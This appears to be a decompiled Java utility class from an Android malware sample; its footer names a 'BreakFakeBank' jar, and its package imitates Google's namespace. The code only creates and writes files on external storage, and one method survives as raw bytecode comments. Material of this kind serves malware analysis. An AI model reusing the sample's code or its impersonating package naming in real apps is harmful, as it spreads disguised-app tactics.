package com.google.bps.bfcfc;

import android.os.Environment;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;

public class FileUtils {
  private int FILESIZE = 4096;
  
  private String SDPATH = Environment.getExternalStorageDirectory() + "/";
  
  public File createSDDir(String paramString) {
    File file = new File(String.valueOf(this.SDPATH) + paramString);
    file.mkdir();
    return file;
  }
  
  public File createSDFile(String paramString) throws IOException {
    File file = new File(String.valueOf(this.SDPATH) + paramString);
    file.createNewFile();
    return file;
  }
  
  public String getSDPATH() {
    return this.SDPATH;
  }
  
  public boolean isFileExist(String paramString) {
    return (new File(String.valueOf(this.SDPATH) + paramString)).exists();
  }
  
  public File write2SDFromInput(String paramString1, String paramString2, InputStream paramInputStream) {
    // Byte code:
    //   0: aconst_null
    //   1: astore #4
    //   3: aconst_null
    //   4: astore #5
    //   6: aconst_null
    //   7: astore #6
    //   9: aload #5
    //   11: astore #7
    //   13: aload #4
    //   15: astore #8
    //   17: aload_0
    //   18: aload_1
    //   19: invokevirtual createSDDir : (Ljava/lang/String;)Ljava/io/File;
    //   22: pop
    //   23: aload #5
    //   25: astore #7
    //   27: aload #4
    //   29: astore #8
    //   31: new java/lang/StringBuilder
    //   34: astore #9
    //   36: aload #5
    //   38: astore #7
    //   40: aload #4
    //   42: astore #8
    //   44: aload #9
    //   46: aload_1
    //   47: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   50: invokespecial <init> : (Ljava/lang/String;)V
    //   53: aload #5
    //   55: astore #7
    //   57: aload #4
    //   59: astore #8
    //   61: aload_0
    //   62: aload #9
    //   64: aload_2
    //   65: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   68: invokevirtual toString : ()Ljava/lang/String;
    //   71: invokevirtual createSDFile : (Ljava/lang/String;)Ljava/io/File;
    //   74: astore_1
    //   75: aload #5
    //   77: astore #7
    //   79: aload_1
    //   80: astore #8
    //   82: new java/io/FileOutputStream
    //   85: astore_2
    //   86: aload #5
    //   88: astore #7
    //   90: aload_1
    //   91: astore #8
    //   93: aload_2
    //   94: aload_1
    //   95: invokespecial <init> : (Ljava/io/File;)V
    //   98: aload_0
    //   99: getfield FILESIZE : I
    //   102: newarray byte
    //   104: astore #7
    //   106: aload_3
    //   107: aload #7
    //   109: invokevirtual read : ([B)I
    //   112: istore #10
    //   114: iload #10
    //   116: ifgt -> 129
    //   119: aload_2
    //   120: invokevirtual flush : ()V
    //   123: aload_2
    //   124: invokevirtual close : ()V
    //   127: aload_1
    //   128: areturn
    //   129: aload_2
    //   130: aload #7
    //   132: iconst_0
    //   133: iload #10
    //   135: invokevirtual write : ([BII)V
    //   138: goto -> 106
    //   141: astore_3
    //   142: aload_2
    //   143: astore #7
    //   145: aload_3
    //   146: invokevirtual printStackTrace : ()V
    //   149: aload_2
    //   150: invokevirtual close : ()V
    //   153: goto -> 127
    //   156: astore_2
    //   157: aload_2
    //   158: invokevirtual printStackTrace : ()V
    //   161: goto -> 127
    //   164: astore_1
    //   165: aload #7
    //   167: invokevirtual close : ()V
    //   170: aload_1
    //   171: athrow
    //   172: astore_2
    //   173: aload_2
    //   174: invokevirtual printStackTrace : ()V
    //   177: goto -> 170
    //   180: astore_2
    //   181: aload_2
    //   182: invokevirtual printStackTrace : ()V
    //   185: goto -> 127
    //   188: astore_1
    //   189: aload_2
    //   190: astore #7
    //   192: goto -> 165
    //   195: astore_3
    //   196: aload #8
    //   198: astore_1
    //   199: aload #6
    //   201: astore_2
    //   202: goto -> 142
    // Exception table:
    //   from	to	target	type
    //   17	23	195	java/lang/Exception
    //   17	23	164	finally
    //   31	36	195	java/lang/Exception
    //   31	36	164	finally
    //   44	53	195	java/lang/Exception
    //   44	53	164	finally
    //   61	75	195	java/lang/Exception
    //   61	75	164	finally
    //   82	86	195	java/lang/Exception
    //   82	86	164	finally
    //   93	98	195	java/lang/Exception
    //   93	98	164	finally
    //   98	106	141	java/lang/Exception
    //   98	106	188	finally
    //   106	114	141	java/lang/Exception
    //   106	114	188	finally
    //   119	123	141	java/lang/Exception
    //   119	123	188	finally
    //   123	127	180	java/io/IOException
    //   129	138	141	java/lang/Exception
    //   129	138	188	finally
    //   145	149	164	finally
    //   149	153	156	java/io/IOException
    //   165	170	172	java/io/IOException
  }
}


/* Location:              /home/fahim/Desktop/BreakFakeBank-dex2jar.jar!/com/google/bps/bfcfc/FileUtils.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */